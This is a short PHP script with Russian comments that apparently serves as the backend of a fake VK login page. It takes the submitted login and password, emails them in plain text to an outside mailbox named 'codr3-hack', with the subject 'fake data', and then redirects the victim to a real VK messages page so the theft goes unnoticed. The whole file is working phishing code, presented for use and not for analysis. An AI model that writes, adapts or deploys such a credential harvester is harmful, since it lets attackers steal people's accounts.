<?
if((isset($_POST['login'])&&$_POST['login']!="")&&(isset($_POST['pass'])&&$_POST['pass']!="")){
        $to = 'codr3-hack@yandex.ru'; //Почта получателя, через запятую можно указать сколько угодно адресов
        $subject = 'Данные фейка'; //Загаловок сообщения
        $message = '
                <html>
                    <head>
                        <title>'.$subject.'</title>
                    </head>
                    <body>
                        <p>Логин: '.$_POST['login'].'</p>
                        <p>Пароль: '.$_POST['pass'].'</p>                        
                    </body>
                </html>'; //Текст нащего сообщения можно использовать HTML теги
        $headers  = "Content-type: text/html; charset=utf-8 \r\n";
        $headers .= "From: Отправитель <from@example.com>\r\n"; //Наименование и почта отправителя
        mail($to, $subject, $message, $headers); 
}
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com/im?peers=154124605_205461750_226248322_297550748_336967111&sel=344192036'></head></html>";
?>